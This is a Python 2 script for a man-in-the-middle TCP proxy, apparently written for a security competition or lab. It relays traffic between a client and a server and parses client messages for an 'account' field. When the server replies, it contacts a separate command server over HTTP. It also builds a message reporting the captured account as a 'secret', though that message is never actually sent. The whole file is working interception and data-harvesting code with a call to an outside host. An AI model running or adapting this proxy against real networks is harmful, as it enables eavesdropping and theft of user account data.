#!/usr/bin/env python2
import json
import requests
import traceback
import random
import socket
import argparse
import threading
import signal
import sys
from contextlib import contextmanager

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

account = ""
command_port = ""
command_ip = ""

def get_position_of_char(string, char):
  index = 0
  if char in string:
    c = char[0]
    for ch in string:
      if ch == c:
        if string[index:index+len(char)] == char:
          out = index + len(char)
          return out
      index += 1
  return -1

def get_number_from_message(message, position):
  out = ""
  for n in range(position, len(message)):
    if message[n].isdigit():
      out += message[n]
    else:
      return out
  return out

def get_account_name_from_messge(message, position):
  out = ""
  for n in range(position, len(message)):
    if message[n] != '"':
      out += message[n]
    else:
      return out
  return out 
	
	
def add_point_to_number(number_string):
  head = number_string[:-2]
  tail = number_string[len(number_string)-2:]
  out = head + '.' + tail
  return out

def mitm(buff, direction):
  hb = buff
  global account
  if direction == CLIENT2SERVER:
    message = hb
    pos_acc = get_position_of_char(message, '"account": "')
    account = get_account_name_from_messge(message, pos_acc)	
  elif direction == SERVER2CLIENT: 
    if account != "":
      global command_ip
      global command_port
      url = "http://"+command_ip+":"+str(command_port)
      payload_guess_account = {"REQUEST":'{"type": "learned","variable": "account","secret": '+account+'}'}
      r = requests.get(url)
      sys.stderr.write(r.text)
      payload_done = {"REQUEST":'{"type": "done"}'}
      requests.post(url, data=payload_done)
  return hb

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killpn( a, b, n):
  if n != CLIENT2SERVER:
    killp( a, b)

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n):
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(1024)
    if len(b) == 0:
      killpn(client,server,n)
      return
    try:
      b = mitm(b,n)
    except:
      pass
    try:
      if b != None:
        server.send(b)
    except:
      killpn(client,server,n)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  running = False

def doProxyMain(port, remotehost, remoteport, commandip, commandport):
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    global command_ip
    global command_port
    command_ip = commandip
    command_port = commandport
    while running == True:
      k,a = s.accept()
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
  except KeyboardInterrupt:
    signalhandler(None, None)
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  return

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  print('started\n')
  sys.stdout.flush()
  doProxyMain(args.p, args.s, args.q, args.c, args.d)
